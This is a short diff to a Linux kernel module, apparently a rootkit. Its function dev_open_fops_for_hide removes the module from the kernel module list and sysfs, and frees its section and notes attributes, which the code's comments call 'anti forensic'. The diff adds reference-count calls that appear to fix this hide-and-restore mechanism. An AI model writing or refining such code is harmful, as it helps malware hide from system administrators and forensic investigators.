@@ -66,6 +66,7 @@ int dev_open_fops_for_hide(struct inode *inode, struct file* file)
         saved_kobj_parent = THIS_MODULE->mkobj.kobj.parent;
         list_del_init(&THIS_MODULE->list);//remove form the modules linked list
         sysfs_remove_fir_orig(&THIS_MODULE->mkobj.kobj);//remove the specific dir (not the object from the module)
+        kobject_put(saved_kobj_parent);
         kfree(THIS_MODULE->sect_attrs);/*clean informasion for anti forensic*/
         kfree(THIS_MODULE->notes_attrs);/*using kfree to clean*/
         THIS_MODULE->notes_attrs = NULL;/* and then puts, NULL to seve the setings */
@@ -79,6 +80,7 @@ int dev_open_fops_for_hide(struct inode *inode, struct file* file)
         while (!mutex_trylock(&module_mutex))
             cpu_relax();
         list_add(&THIS_MODULE->list, module_list);
+        kobject_get(saved_kobj_parent);
         sysfs_create_fir_orig(saved_kobj_parent);
         is_hide=0;
         
